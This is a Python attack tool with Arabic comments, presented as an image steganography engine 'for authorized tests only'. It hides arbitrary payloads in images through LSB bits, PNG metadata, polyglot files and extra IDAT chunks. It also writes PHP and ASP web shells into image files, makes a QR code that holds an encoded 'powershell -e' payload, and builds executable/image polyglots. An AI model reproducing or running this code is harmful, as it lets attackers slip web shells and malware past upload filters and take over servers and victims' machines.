#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Image Steganography Engine - محرك إخفاء في الصور
للاختبارات المصرح بها فقط
"""

import os
import io
import zlib
import struct
import random
import base64


class ImageSteganographyEngine:
    """محرك إخفاء البايلودات في الصور"""
    
    def lsb_encode(self, image_path, payload_path, output_path, bits_per_channel=1, encrypt=False, password=None):
        """
        إخفاء بايلود في Least Significant Bits
        """
        try:
            from PIL import Image
            import numpy as np
        except ImportError:
            print("[!] يرجى تثبيت Pillow: pip install Pillow numpy")
            return None
        
        print(f"[*] Loading image: {image_path}")
        img = Image.open(image_path)
        
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = np.array(img)
        height, width, channels = pixels.shape
        
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        if encrypt and password:
            key = password.encode()
            xored = bytearray()
            for i, byte in enumerate(payload_data):
                xored.append(byte ^ key[i % len(key)])
            payload_data = bytes(xored)
        
        # Header: length (4 bytes) + name (50 bytes)
        payload_name = os.path.basename(payload_path).encode()[:50].ljust(50, b'\x00')
        header = struct.pack('>I', len(payload_data)) + payload_name
        full_payload = header + payload_data
        
        # Convert to bits
        bits = []
        for byte in full_payload:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        
        # Check capacity
        max_bits = height * width * channels * bits_per_channel
        if len(bits) > max_bits:
            # Compress
            compressed = zlib.compress(full_payload)
            header = struct.pack('>I', len(compressed)) + b'[CMPR]'.ljust(50, b'\x00')
            full_payload = header + compressed
            
            bits = []
            for byte in full_payload:
                for i in range(7, -1, -1):
                    bits.append((byte >> i) & 1)
        
        if len(bits) > max_bits:
            raise ValueError(f"الصورة صغيرة جدًا. تحتاج {len(bits)} بت، المتاح {max_bits} بت")
        
        # Embed bits
        bit_idx = 0
        for y in range(height):
            for x in range(width):
                for c in range(channels):
                    if bit_idx < len(bits):
                        pixels[y, x, c] = (pixels[y, x, c] & ~0b1) | bits[bit_idx]
                        bit_idx += 1
        
        result_img = Image.fromarray(pixels)
        result_img.save(output_path)
        
        print(f"[+] تم حفظ الصورة مع البايلود: {output_path}")
        print(f"[+] البتات المخفية: {bit_idx}/{len(bits)}")
        
        # Save info
        with open(output_path + '.info', 'w') as f:
            f.write(f"Image: {image_path}\n")
            f.write(f"Payload: {payload_path}\n")
            f.write(f"Size: {len(payload_data)} bytes\n")
            f.write(f"Bits: {bit_idx}\n")
        
        return output_path
    
    def metadata_encode(self, image_path, payload_path, output_path):
        """إخفاء في بيانات EXIF/Metadata"""
        try:
            from PIL import Image
            from PIL.PngImagePlugin import PngInfo
        except ImportError:
            print("[!] يرجى تثبيت Pillow")
            return None
        
        img = Image.open(image_path)
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        payload_b64 = base64.b64encode(payload).decode()
        
        if image_path.lower().endswith('.png'):
            metadata = PngInfo()
            chunks = [payload_b64[i:i+100] for i in range(0, len(payload_b64), 100)]
            
            metadata.add_text("Comment", f"DarkForge:{len(payload)}:{len(chunks)}")
            for i, chunk in enumerate(chunks):
                metadata.add_text(f"XMP.darkforge.{i}", chunk)
            
            img.save(output_path, 'PNG', pnginfo=metadata)
        else:
            # Convert to PNG
            metadata = PngInfo()
            metadata.add_text("Comment", f"DarkForge:{len(payload)}")
            metadata.add_text("payload", payload_b64)
            output_path = output_path.rsplit('.', 1)[0] + '.png'
            img.save(output_path, 'PNG', pnginfo=metadata)
        
        print(f"[+] تم إخفاء البايلود في Metadata: {output_path}")
        return output_path
    
    def polyglot_encode(self, image_path, payload_path, output_path, format_type="gif+zip"):
        """إنشاء Polyglot file"""
        with open(image_path, 'rb') as f:
            image_data = f.read()
        
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
        
        if format_type == "gif+zip":
            # GIF + ZIP polyglot
            gif_end = image_data.rfind(b'\x00\x3B')
            if gif_end == -1:
                gif_end = len(image_data)
            else:
                gif_end += 2
            
            result = image_data[:gif_end] + payload_data + image_data[gif_end:]
            
        elif format_type == "png+exe":
            result = b'MZ\x90\x00' + payload_data[2:] + b'\x00' * 100 + image_data
        
        elif format_type == "jpg+php":
            php_code = b'<?php system($_GET["cmd"]); ?>'
            result = image_data + b'\n' + php_code
        
        else:
            result = image_data + b'\n' + payload_data
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إنشاء Polyglot ({format_type}): {output_path}")
        return output_path
    
    def pixel_encoding_encode(self, image_path, payload_path, output_path):
        """إخفاء في قيم البيكسلات مباشرة"""
        try:
            from PIL import Image
            import numpy as np
        except ImportError:
            return None
        
        img = Image.open(image_path)
        if img.mode != 'RGB':
            img = img.convert('RGB')
        
        pixels = np.array(img)
        height, width, channels = pixels.shape
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        len_bytes = struct.pack('>I', len(payload))
        full_payload = len_bytes + payload
        
        margin = 50
        pixel_idx = 0
        for i in range(0, len(full_payload), 3):
            y = margin + (pixel_idx // (width - 2 * margin))
            x = margin + (pixel_idx % (width - 2 * margin))
            
            if y >= height - margin:
                break
            
            r = full_payload[i] if i < len(full_payload) else 0
            g = full_payload[i+1] if i+1 < len(full_payload) else 0
            b = full_payload[i+2] if i+2 < len(full_payload) else 0
            
            pixels[y, x] = [r, g, b]
            pixel_idx += 1
        
        result_img = Image.fromarray(pixels)
        result_img.save(output_path)
        
        print(f"[+] تم إخفاء البايلود في بيكسلات: {output_path}")
        return output_path
    
    def qr_exploit_encode(self, image_path, payload_path, output_path, website_url="http://evil.com"):
        """إنشاء QR Code exploit"""
        try:
            import qrcode
        except ImportError:
            print("[!] قم بتثبيت qrcode: pip install qrcode[pil]")
            return None
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        payload_b64 = base64.b64encode(payload).decode()
        
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_H, box_size=10, border=4)
        qr.add_data(f"powershell -e {payload_b64}")
        qr.make(fit=True)
        
        qr_img = qr.make_image(fill_color="black", back_color="white")
        
        if image_path and os.path.exists(image_path):
            from PIL import Image
            bg_img = Image.open(image_path)
            qr_size = min(bg_img.width, bg_img.height) // 3
            qr_img = qr_img.resize((qr_size, qr_size))
            bg_img.paste(qr_img, (bg_img.width - qr_size - 20, 20))
            bg_img.save(output_path)
        else:
            qr_img.save(output_path)
        
        print(f"[+] تم إنشاء QR Code: {output_path}")
        return output_path
    
    def idat_encode(self, image_path, payload_path, output_path):
        """إخفاء في IDAT chunk (PNG)"""
        with open(image_path, 'rb') as f:
            png_data = f.read()
        
        if png_data[:8] != b'\x89PNG\r\n\x1a\n':
            raise ValueError("ليس ملف PNG")
        
        with open(payload_path, 'rb') as f:
            payload = f.read()
        
        compressed = zlib.compress(payload)
        chunk_type = b'IDAT'
        chunk_data = compressed
        chunk_len = struct.pack('>I', len(chunk_data))
        chunk_crc = struct.pack('>I', zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF)
        new_chunk = chunk_len + chunk_type + chunk_data + chunk_crc
        
        iend_pos = png_data.rfind(b'IEND')
        insert_pos = iend_pos - 4
        
        result = png_data[:insert_pos] + new_chunk + png_data[insert_pos:]
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إخفاء البايلود في IDAT: {output_path}")
        return output_path
    
    def create_image_shell(self, image_path, output_path, shell_type="php"):
        """إنشاء Web Shell داخل صورة"""
        with open(image_path, 'rb') as f:
            img_data = f.read()
        
        if shell_type == "php":
            shell_code = b'<?php system($_GET["cmd"]); ?>'
        elif shell_type == "asp":
            shell_code = b'<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>'
        else:
            shell_code = b'<?php system($_GET["cmd"]); ?>'
        
        result = img_data + b'\n' + shell_code
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        print(f"[+] تم إنشاء Image Shell: {output_path}")
        return output_path
